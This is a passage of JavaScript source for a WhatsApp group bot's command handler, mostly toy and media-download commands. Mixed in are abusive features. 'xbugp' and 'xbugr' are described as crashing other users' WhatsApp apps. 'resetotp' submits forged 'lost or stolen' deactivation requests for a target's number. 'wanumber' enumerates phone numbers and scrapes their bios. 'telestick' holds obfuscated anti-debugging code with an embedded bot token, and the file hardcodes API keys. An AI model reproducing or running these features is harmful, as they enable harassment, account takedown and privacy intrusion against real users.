            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
            await replygcxeon(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replygcxeon(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
XeonBotInc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
           case 'jodoh':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
XeonBotInc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./YaeMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
XeonBotInc.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./YaeMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
    case 'coffee': case 'kopi': {
XeonBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
if (!text) return replygcxeon('Enter Query Title')
reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
if (!text) return replygcxeon('Enter Query Title')
reply(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replygcxeon(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             XeonBotInc.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./YaeMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     
case 'igstalk': {
if (!args[0]) return replygcxeon(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_xeon13`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await XeonBotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        replygcxeon(`Make sure the username comes from *Instagram*`)
      }
}
break
           case "igimg": case "instaimg":  {
if (!text) return replygcxeon(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
reply(mess.wait)
const risponsxeon = await XeonIgImg(text)
for (let i=0;i<risponsxeon.length;i++) {
let ghd = await XeonBotInc.sendFileUrl(m.chat, risponsxeon[i], `Ini dia!!`, m)
}
}
break 

case 'facebook': case 'fbdl': case 'fb': {
reply(mess.wait);
  if (!text) return replygcxeon(`Contoh: ${prefix + command} link`);
  if (!text.includes('facebook')) return replygcxeon('Link Tidak Valid!!');
  let data = await fetchJson(`https://vihangayt.me/download/fb?url=${encodeURIComponent(text)}`);
  if (data) {
    const videoUrl = data.video_hd;
    const videoCaption = data.desc || "Video Facebook";
    XeonBotInc.sendMessage(m.chat, { caption: videoCaption, video: { url: videoUrl } }, { quoted: m });
  } else {
    replygcxeon('Video Facebook tidak ditemukan atau terjadi kesalahan.');
  }
}
break;
case "twittervid":case "twitvid":{
if (!text) return replygcxeon(`Where is the url?\n\nExample: ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
reply(mess.wait)
let res = await XeonTwitter(q)
let ghdx = await XeonBotInc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
    case 'say': case 'tts': case 'gtts':{
if (!text) return replygcxeon('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return XeonBotInc.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case 'telestick': { //credit agan
        	if (m.isGroup) return XeonStickPrivate()
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await XeonBotInc[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcxeon(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case "aimage": {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Generate image from AI.\n\nContoh:\n${prefix + command} Cowok Naik Kuda`)
let aimage = await fetchJson(`https://vihangayt.me/tools/aiimg?q=${q}`)
foto = await getBuffer(aimage.data.url)
XeonBotInc.sendMessage(m.chat, { image: foto, caption: mess.success}, {quoted:m})
}
break
case 'myip': {
        if (!XeonTheCreator) return XeonStickOwner()
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replygcxeon("🔎 Ip Andreas Anda Adalah: " + ip)
})
})
            }
        break
        case 'mathquiz': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replygcxeon(`Mode: ${Object.keys(modes).join(' | ')}\npilih example: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
XeonBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replygcxeon("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break
            case 'lyrics':
            case 'lirik': {
if (!text) return replygcxeon(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
reply(mess.wait)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcxeon(`
*Judul :* ${result.title}
*Author :* ${result.author}
*Link :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'gdrive': {
		if (!args[0]) return replygcxeon(`Silakan Masukan Link gdrive Anda`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcxeon(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	XeonBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcxeon('Error: Silakan Cek Link gdrive Anda 🗿') 
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return XeonStickBotAdmin()
if (!text) return replygcxeon(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 6285892928715`)
if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await XeonBotInc.groupInviteCode(group)
      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcxeon(` An invite link is sent to the user`) 
}
break
case "xnxxdl": {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replygcxeon(`Enter Url`)
        if (!text.includes('xnxx.com')) return replygcxeon(`Enter an xnxx link`)
        reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
XeonBotInc.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.result.title}
▢ *⌚Duration* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replygcxeon(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replygcxeon(ff)
              }
              break
              case 'pin': 
              case 'pinterest': {
              	if (!text) return replygcxeon(`Enter Query`)
reply(mess.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcxeon(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replygcxeon(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await XeonBotInc.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replygcxeon('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replygcxeon(`Anime Apa Yang Anda Cari?`)
const malScraper = require('mal-scraper')
reply(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcxeon(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await XeonBotInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'imdb':
if (!text) return replygcxeon(`_Name a Series or movie`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           XeonBotInc.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
case 'cuaca':
case 'weather': {
    if (!text) return replygcxeon('What location?');
    let data = await fetchJson(`https://kiicodeofficial.my.id/api/others/cuaca?kota=${text}&apikey=Dzsyacans`);
    let textw = (`「 📍 」Nama Kota: ${data.data.Nama}\n「 🌡️ 」Temperatur: ${data.data.Suhu}\n「 🌬️ 」Angin: ${data.data.Angin}\n「 🌤️ 」 Weather: ${data.data.Keterangan}`)
    reply(`${textw}`);
}
break;

           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
	//bug && war cases
case 'xbugp' : { //crashes mod whatsapps
if (!XeonTheCreator) return XeonStickOwner()
if (!text) return replygcxeon(`Example : ${prefix + command} xeon bihari😂`)
const { xeonorwot } = require('./XBug/xeonbut2')
let teks = `${text}`
{
XeonBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${xeonorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA XEON`,"body": ` ${xeonytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${xeonorwot}`,
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'xbugr':{ //crashes both mod and playstore wa
if (!XeonTheCreator) return XeonStickOwner()
const { xeonorwot } = require('./XBug/xeonbut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break
case "resetotp": {
if (Input) {
let cekno = await XeonBotInc.onWhatsApp(Input)
if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🦄!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`Success..!`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`Moderate Limit Wait A Moment.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Enter Target Number!')
}
break

default:

if (budy.startsWith('<')) {
if (!XeonTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('$ ')) {
  if (!XeonTheCreator) return;
  try {
    exec(budy.slice(2), (err, stdout) => {
      if (err) return reply(`${err}`);
      if (stdout) return reply(stdout);
    });
  } catch (e) {
    reply(e);
  }
}


if (budy.startsWith('vv')) {
if (!XeonTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!XeonTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
XeonBotInc.sendMessage("6285892928715@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
